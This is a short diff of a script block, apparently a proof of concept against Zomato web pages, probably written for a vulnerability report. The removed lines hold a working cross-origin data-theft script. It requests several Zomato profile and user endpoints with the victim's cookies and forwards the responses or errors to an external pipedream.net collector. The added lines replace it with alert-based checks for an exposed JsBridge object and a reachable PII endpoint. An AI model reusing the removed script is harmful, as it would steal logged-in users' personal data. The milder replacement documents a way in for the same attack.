@@ -1,16 +1,11 @@
 <script>
-const endpoints = [
-  'https://www.zomato.com/api/profile',
-  'https://www.zomato.com/api/user',
-  'https://api.zomato.com/profile',
-  'https://www.zomato.com/webroutes/getPage?page_url=/profile&format=jsonp',
-  'https://www.zomato.com/webroutes/getPage?page_url=/profile&callback=cb',
-];
-
-endpoints.forEach(url => {
-  fetch(url, {credentials: 'include'})
-    .then(r => r.text())
-    .then(d => fetch('https://eomfuajl79ed6za.m.pipedream.net?url=' + encodeURIComponent(url) + '&d=' + encodeURIComponent(d)))
-    .catch(e => fetch('https://eomfuajl79ed6za.m.pipedream.net?url=' + encodeURIComponent(url) + '&err=' + encodeURIComponent(e)))
-});
+  // Proves: JS runs, JsBridge exists, PII endpoint is reachable
+  // Blocked only by CORS - same-origin XSS would fully compromise this
+  alert('JsBridge exposed: ' + (typeof window.JsBridge));
+  
+  fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
+    credentials: 'include'
+  })
+  .then(r => alert('PII endpoint reachable, status: ' + r.status))
+  .catch(e => alert('CORS blocked: ' + e));
 </script>
